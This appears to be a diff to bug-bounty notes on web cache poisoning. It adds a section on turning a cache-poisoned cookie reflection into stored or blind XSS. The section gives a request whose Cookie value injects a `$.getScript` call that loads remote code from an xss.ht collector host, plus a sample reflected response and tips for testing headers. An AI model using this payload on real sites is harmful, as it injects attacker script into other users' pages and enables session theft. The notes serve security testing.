@@ -94,11 +94,58 @@ curl "https://target.site/?param=1" --compressed | grep -i 'cookies'
         Ak-Uuid: 0.bc85d817.1658419977.1592c61
 
 **This becomes an issue when the site uses caching servers. Sites typically only caches javascript, css and other files, but when sites like www.host.com also caches normal responses like**
+
 _www.host.com/product/*_
+
 _www.host.com/*_
 
 etc... It become a very impactful bug:
 
-    
-         
+## Case 4: Cache Poisoing to Stored XSS
+
+***Try in cookies if cookies body reflecting in response body: Try Stored XSSS, BXSS**
+ 
+**Try for Blind XSS on Cookie if target blocking try jquery payload ```$.getScript``` will help you.**
+request:
+
+        GET /xxxx/xx-xx.otf?triagethiss HTTP/2
+        Host: www.host.com
+        Cookie: n_vis=xssx'*$.getScript`//593.xss.ht`//;
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+        Accept-Language: en-xss,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Upgrade-Insecure-Requests: 1
+        Te: trailers
+
+  response:
+  
+        <script>
+        ...
+        Visitor.id='xssx'*$.getScript`//593.xss.ht`//;
+        ....
+        </script>
+
+### Tips & Tricks:
+**Test for XSS on any Request Heder, cookies, Custom Header, X-Forwarded-*  Header**
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
 
